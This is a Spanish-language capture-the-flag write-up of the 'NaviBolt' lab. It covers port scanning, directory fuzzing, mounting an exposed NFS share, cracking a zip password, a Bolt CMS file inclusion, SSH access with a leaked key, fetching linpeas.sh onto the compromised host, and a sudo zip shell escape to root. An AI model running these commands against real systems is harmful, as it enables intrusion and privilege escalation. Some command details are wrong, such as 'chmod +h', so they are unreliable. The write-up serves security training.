---
title: NaviBolt - Writeup
date: 2026-02-16 11:14:30 +/-TTTT
categories: [Máquinas]
tags: [Linux, cracking, settings, fuzzing, CMS]  # TAG names should always be lowercase

description: Laboratorio
toc: false
---

<p style="font-size:1.2rem;">
En este artículo se presenta la resolución de la máquina NaviBolt, un laboratorio orientado a la identificación y explotación de múltiples fallos de configuración en un entorno Linux.
</p>

<p style="font-size:1.2rem;">
Durante el proceso se llevó a cabo una fase de reconocimiento y enumeración que permitió detectar servicios expuestos y configuraciones inseguras, lo que facilitó la obtención de acceso inicial al sistema. Posteriormente, mediante técnicas de enumeración local y análisis de privilegios, se identificaron debilidades que posibilitaron la escalada de privilegios hasta obtener control total de la máquina.

Este laboratorio demuestra cómo la combinación de malas configuraciones, gestión inadecuada de permisos y prácticas inseguras puede derivar en el compromiso completo de un sistema.
</p>

## Reconocimiento

<p style="font-size:1.2rem;">

Realizamos un escaneo de puertos bàsico primeramente para reconocer que <strong>puertos estàn abiertos en ambas màquinas:</strong>
</p>

```
sudo nmap -sS --min-rate 6000 -p- 192.168.136.152-153
```

![Desktop View](/assets/img/navi_bolt/foto1.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
A continuación, podemos identificar los siguientes <strong>puertos y servicios abiertos</strong>:
</p>

<p style="font-size:2.0rem; margin-bottom:0;">
<strong>192.168.136.152</strong>
</p>

<p style="font-size:1.2rem; margin-top:0;">
<strong>22</strong> = open <strong>SSH</strong><br>
<strong>80</strong> = open <strong>HTTP</strong><br>
<strong>111</strong> = open <strong>RPCBIND</strong><br>
<strong>2049</strong> = open <strong>NFS</strong><br>
<strong>8080</strong> = open <strong>HTTP</strong><br>
<strong>37823</strong> = open <strong>MOUNTD</strong><br>
<strong>43155</strong> = open <strong>NLOCKMGR</strong><br>
<strong>50153</strong> = open <strong>MOUNTD</strong><br>
<strong>60387</strong> = open <strong>MOUNTD</strong>
</p>

<p style="font-size:2.0rem; margin-bottom:0;">
<strong>192.168.136.153</strong>
</p>

<p style="font-size:1.2rem; margin-top:0;">
<strong>21</strong> = open <strong>FTP</strong><br>
<strong>53</strong> = open <strong>DNS</strong><br>
<strong>80</strong> = open <strong>HTTP</strong>
</p>

<p style="font-size:1.2rem;">

Ahora, realizamos un escaneo de puertos completo para reconocer las <strong>versiones de los servicios y tambièn descubrir màs informaciòn acerca de los puertos:
</strong>
</p>

```
sudo nmap -sVC --min-rate 6000 -vvv -p22,53,80,111,2049,8080,37823,43155,50153,60387 192.168.136.152-153 -oA scan_navibolt_ports 
```

![Desktop View](/assets/img/navi_bolt/foto2.jpeg){: width="800" height="800" }

<p style="font-size:2.0rem; margin-bottom:0;">
<strong>192.168.136.152</strong>
</p>

<p style="font-size:1.2rem; margin-top:0;">
<strong>22</strong> = open <strong>SSH</strong> OpenSSH 7.9p1 Debian 10+deb10u2<br>
<strong>80</strong> = open <strong>HTTP</strong> Apache httpd 2.4.38<br>
<strong>111</strong> = open <strong>RPCBIND</strong><br>
<strong>2049</strong> = open <strong>NFS</strong><br>
<strong>8080</strong> = open <strong>HTTP</strong> Apache httpd 2.4.38<br>
<strong>37823</strong> = open <strong>MOUNTD</strong><br>
<strong>43155</strong> = open <strong>NLOCKMGR</strong><br>
<strong>50153</strong> = open <strong>MOUNTD</strong><br>
<strong>60387</strong> = open <strong>MOUNTD</strong>
</p>

<p style="font-size:2.0rem; margin-bottom:0;">
<strong>192.168.136.153</strong>
</p>

<p style="font-size:1.2rem; margin-top:0;">
<strong>22</strong> = open <strong>SSH</strong> OpenSSH 7.9p1 Debian 10+deb10u2<br>
<strong>53</strong> = open <strong>DNS</strong> ISC BIND 9.11.5-P4-5.1+deb10u5<br>
<strong>80</strong> = open <strong>HTTP</strong> nginx 1.14.2<br> 
</p>

<p style="font-size:1.2rem;">

Realizamos otra vez un escaneo y detallado de los hosts<strong> para ademàs de identificar servicios detectar vulnerabilidades en los puertos específicos:
</strong>
</p>

```
sudo nmap -sV --script vuln --min-rate 6000 -vvv -p22,53,80,111,2049,8080,37823,43155,50153,60387 192.168.136.152-153 -oA scan_navibolt_vuln
```

![Desktop View](/assets/img/navi_bolt/foto3.jpeg){: width="800" height="800" }
![Desktop View](/assets/img/navi_bolt/foto4.jpeg){: width="800" height="800" }
![Desktop View](/assets/img/navi_bolt/foto5.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
A continuaciòn, vemos que en los puertos 80 y 8080 de la màquina 192.168.136.152 hay algunos subdirectorios expuestos y lo podemos comprobar haciendo tambièn un fuzzing de directorios:
</p>

<p style="font-size:1.2rem;">
Puerto 80:
</p>

![Desktop View](/assets/img/navi_bolt/foto10.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
Ademàs tambièn encontramos que la pàgina tiene un CMS de Bolt, esto nos podrìa servir màs adelante: 
</p>

![Desktop View](/assets/img/navi_bolt/foto20.jpeg){: width="800" height="800" }

```
gobuster dir -u http://192.168.136.152 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404 -r
```
![Desktop View](/assets/img/navi_bolt/foto6.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
Investigando los subdirectorios en el puerto 80 encontramos un archivo config.yml el cuàl contiene un usuario y contraseña:
</p>

![Desktop View](/assets/img/navi_bolt/foto8.jpeg){: width="800" height="800" }
![Desktop View](/assets/img/navi_bolt/foto9.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
Puerto 8080:
</p>

![Desktop View](/assets/img/navi_bolt/foto11.jpeg){: width="800" height="800" }

```
gobuster dir -u http://192.168.136.152:8080 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -b 404 -r
```

![Desktop View](/assets/img/navi_bolt/foto7.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
Vemos que el subdirectorio que encontramos hay una pàgina de registro de usuarios, nos inventamos cualquier usuario y contraseña para crear:
</p>

![Desktop View](/assets/img/navi_bolt/foto12.jpeg){: width="800" height="800" }

![Desktop View](/assets/img/navi_bolt/foto13.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
Revisando los otros puertos y servicios abiertos, el puerto 2049 tiene completamente activo el ecosistema NFS (rpcbind + nfs + mountd + nlockmgr + nfs_acl), lo que significa que el servicio está operativo y expone múltiples procesos RPC que pueden ser enumerados y potencialmente explotados:
</p>

![Desktop View](/assets/img/navi_bolt/foto14.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
Hacemos una consulta remotamente al servidor NFS para enumerar los clientes que actualmente tienen montados recursos compartidos desde dicho servidor:
</p>

```
showmount -a 192.168.136.152 
```

<p style="font-size:1.2rem;">
Enumeramos los directorios exportados por un servidor NFS y las redes o direcciones IP autorizadas para acceder a dichos recursos:
</p>

```
showmount -e 192.168.136.152 
```
![Desktop View](/assets/img/navi_bolt/foto15.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
Verificamos que el directorio /srv/nfs era accesible desde la red del atacante, lo que habilitó su posterior montaje y análisis. Una vez identificado el recurso exportado a través del servicio NFS, se procedió a montar el directorio compartido para analizar su contenido. Posteriormente, se montó el recurso NFS exportado (/srv/nfs) desde la màquina 192.168.136.152 hacia el directorio local creado.
</p>

```
mkdir montaje 
sudo mount -t nfs 192.168.136.152:/srv/nfs /home/kali/Desktop/PMJ/Navi_Bolt/montaje
tree montaje
cp /home/kali/Desktop/PMJ/Navi_Bolt/montaje/save.zip .
```

<p style="font-size:1.2rem;">
Este procedimiento permitió acceder al sistema de archivos remoto como si fuera un directorio local, facilitando la inspección directa de su contenido y como podemos ver encontramos un archivo "save.zip":
</p>

![Desktop View](/assets/img/navi_bolt/foto16.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
Descomprimimos el zip y vemos su contenido: 
</p>

```
unzip save.zip 
```
```
unzip -l save.zip 
```

![Desktop View](/assets/img/navi_bolt/foto17.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
A continuaciòn, vemos que el archivo tiene contraseña y por lo pronto no sabemos cuàl es la contraseña.
</p>

<p style="font-size:1.2rem;">
Como no sabemos a contraseña, hacemos un ataque de fuerza bruta de diccionario sobre el archivo:
</p>

```
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```

![Desktop View](/assets/img/navi_bolt/foto18.jpeg){: width="800" height="800" }

<p style="font-size:1.2rem;">
Con èxito logramos encontrar la contraseña.
</p>

<p style="font-size:1.2rem;">
A continuaciòn, logramos encontrar la bandera1 y tambièn otro archivo.txt que dice lo siguiente: 
</p>

![Desktop View](/assets/img/navi_bolt/foto19.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
En la pàgina de Exploit Database revisamos si es que hay alguna vulnerabilidad del CMS de Bolt que encontramos anteriormente: 
</p>

![Desktop View](/assets/img/navi_bolt/foto21.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Esta vulnerabilidad permite que un usuario autenticado incluya y lea archivos locales del sistema mediante manipulación de parámetros en la URL (anteriormente ya creamos un usuario dentro del sistema):
</p>

![Desktop View](/assets/img/navi_bolt/foto22.jpeg){: width="800" height="800"}

![Desktop View](/assets/img/navi_bolt/foto23.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Con èxito logramos ejecutar la consulta y podemos ver los usuarios del sistema. Vemos un usuario llamado "jeanpaul":
</p>

<p style="font-size:1.2rem;">
Anteriormente vimos un id_rsa dentro del archivo zip. Intentamos conectarnos por el servicio ssh con el usuario "jeanpaul":
</p>

```
ls -la id_rsa
chmod 600 id_rsa 
```

![Desktop View](/assets/img/navi_bolt/foto24.jpeg){: width="800" height="800"}

```
ssh -i id_rsa jeanpaul@192.168.136.152 
```

![Desktop View](/assets/img/navi_bolt/foto25.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Logramos la conexiòn con èxito y encontramos la bandera 2:
</p>

![Desktop View](/assets/img/navi_bolt/foto26.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Todavìa no somos root, solo nos logramos conectar mediante el usuario de "jeanpaul". Para el anàlisis de posibles vecores de escalada de privilegios descargamos la herramienta linpeas.sh dentro de la màquina explotada: 
</p>

```
wget 'https://github.com/peass-ng/PEASS-ng/releases/download/20260212-43b28429/linpeas.sh'
```

![Desktop View](/assets/img/navi_bolt/foto27.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Levantamos un servidor web con python para compartir el linpeas de nuestra màquina host a la màquina comprometida: 
</p>

```
python -m http.server 8080 
```

![Desktop View](/assets/img/navi_bolt/foto30.jpeg){: width="800" height="800"}
![Desktop View](/assets/img/navi_bolt/foto31.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Descargamos el linpeas dentro de la màquina explotada, damos permisos de ejecuciòn y lo ejecutamos: 
</p>

```
wget 'https://github.com/peass-ng/PEASS-ng/releases/download/20260212-43b28429/linpeas.sh'
```
```
chmod +h linpeas.sh 
```

![Desktop View](/assets/img/navi_bolt/foto28.jpeg){: width="800" height="800"}
![Desktop View](/assets/img/navi_bolt/foto29.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
A continuaciòn, vemos que hay comandos ejecutados anteriormente en el historial de la lìnea de comandos:
</p>

![Desktop View](/assets/img/navi_bolt/foto33.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Ejecutamos: 
</p>

```
cat /home/jeanpaul/.bash_history
```

![Desktop View](/assets/img/navi_bolt/foto36.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Vemos que sudo -l permite ver qué comandos puede ejecutar un usuario con privilegios elevados mediante sudo. Vemos que podemos coger el permiso de root del binario /usr/bin/zip: 
</p>

```
sudo -l 
```

![Desktop View](/assets/img/navi_bolt/foto37.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Ejecutamos los siguientes comandos para explotar el binario /usr/bin/zip : 
</p>

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

![Desktop View](/assets/img/navi_bolt/foto38.jpeg){: width="800" height="800"}
![Desktop View](/assets/img/navi_bolt/foto39.jpeg){: width="800" height="800"}

<p style="font-size:1.2rem;">
Somos root y encontramos la bandera 3.
</p>





